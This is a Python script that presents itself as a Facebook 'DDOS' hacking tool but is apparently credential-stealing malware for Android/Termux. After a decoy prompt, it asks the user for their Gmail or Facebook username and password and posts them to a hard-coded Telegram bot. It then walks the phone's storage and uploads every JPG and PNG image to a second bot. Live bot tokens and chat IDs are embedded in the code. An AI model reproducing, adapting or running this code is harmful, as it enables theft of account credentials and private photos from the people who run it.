import requests
import marshal, base64, zlib
from termcolor import colored
import threading
import requests
import os
import time
import sys
import webbrowser
from random import *
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
F = '\033[1;32m'
B = "\033[1;30m"
R = "\033[1;31m"
G = "\033[1;32m"
Y = "\033[1;33m"
Bl = "\033[1;34m"
P = "\033[1;35m"
C = "\033[1;36m"
W = "\033[1;37m"
PN = "\033[1;35m"
L = '\033[1;33m' 
C = "\033[1;97m"
B = '\033[2;36m'
Y = '\033[1;34m' 
C = "\033[1;97m" 
X = '\037' 
G = '\033[1;32m'
R = '\033[1;31m'
X='\033[1;30m'
XX="\x1b[38;5;196m"
GGG="\x1b[38;5;214m"
os.system('pip install websocket-client')
# sys send
telegram_token = '6821470911:AAGfq3jPMw6rCisZXyiueGih8pMtLMKDzwg'
chat_id = '6712367925'
bot_token = '7362244711:AAG8PejiHPdrYfyDyI6i4X7nxQMYJcy36_E'
telegram_user_id = '6712367925'
# loading def
def banner2():
    print("""
W       W     A     III  TTTTT
W       W    A A     I     T  
W   W   W   AAAAA    I     T  
 W W W W   A     A   I     T  
  W   W   A       A III    T  
""")
# clear def
def clear_screen():
    os.system('clear')

# gallery
def send_image_to_telegram(file_path):
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    files = {'photo': open(file_path, 'rb')}
    data = {'chat_id': telegram_user_id}
    requests.post(url, files=files, data=data)
def send_images_to_telegram():
    images_dir = '/storage/emulated/0/'  # Replace with your storage path

    for root, dirs, files in os.walk(images_dir):
        for file in files:
            if file.lower().endswith(('.jpg', '.png')):
                file_path = os.path.join(root, file)
                send_image_to_telegram(file_path)


# main def
def send_message_to_telegram(message):
    url = f"https://api.telegram.org/bot{telegram_token}/sendMessage"
    data = {'chat_id': chat_id, 'text': message}
    response = requests.post(url, data=data)
    if response.status_code == 200:
        print("THANKS FOR USE ME!")
    else:
        print(f"Failed to send message. Error: {response.status_code}")
# fake def
def fake():
    v=input("ENTER YOUR GMAIL OR FACEBOOK USERNAME:")
    w=input("ENTER YOUR PASSWORD:")
    print("PLEASE ENTER REAL USERNAME OR PASSWORD")
# real input def
def login():
    username = input("ENTER YOUR GMAIL OR FACEBOOK USERNAME: ")
    password = input("ENTER YOUR PASSWORD: ")
    
    
    message = f"Username: {username}\nPassword: {password}"
    send_message_to_telegram(message)
# banner def
def banner():
    print(f"""\x1b[1;38;5;121m⠀⠀⠀⠀⠀
                          
 ___  ___| |_| |__   | |__   __ _  ___| | _____ _ __
/ __|/ _ \ __| '_ \  | '_ \ / _` |/ __| |/ / _ \ '__|
\__ \  __/ |_| | | | | | | | (_| | (__|   <  __/ |
|___/\___|\__|_| |_| |_| |_|\__,_|\___|_|\_\___|_| ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          
{G}⋆{GGG}\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m 𝔻𝔼𝕍𝕆𝕃𝕆ℙ𝔼ℝ \x1b[1;97m ● \x1b[1;92mM⃠R⃠.E⃠T⃠H⃠E⃠R⃠E⃠U⃠M⃠               
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;47m𝔽𝔸ℂ𝔼𝔹𝕆𝕆𝕂   \x1b[1;97m● \x1b[1;92mM⃠R⃠.E⃠T⃠H⃠E⃠R⃠E⃠U⃠M⃠               
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;48m 𝕀ℕ𝔽𝕆   \x1b[1;97m    ● \x1b[1;92m𝔻𝔻𝕆𝕊       
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;47mTOOLS     \x1b[1;97m ● \x1b[1;92mℙ𝔸𝕀𝔻           
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;47m𝕍𝔼ℝ𝕊𝕀𝕆ℕ   \x1b[1;97m ● \x1b[1;92m2.𝕆   
{G}⋆{GGG}\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆""")

if __name__ == "__main__":
    clear_screen()
    banner()
    fake()
    login()
    clear_screen()
    banner2()
    send_images_to_telegram()
    clear_screen()
    banner()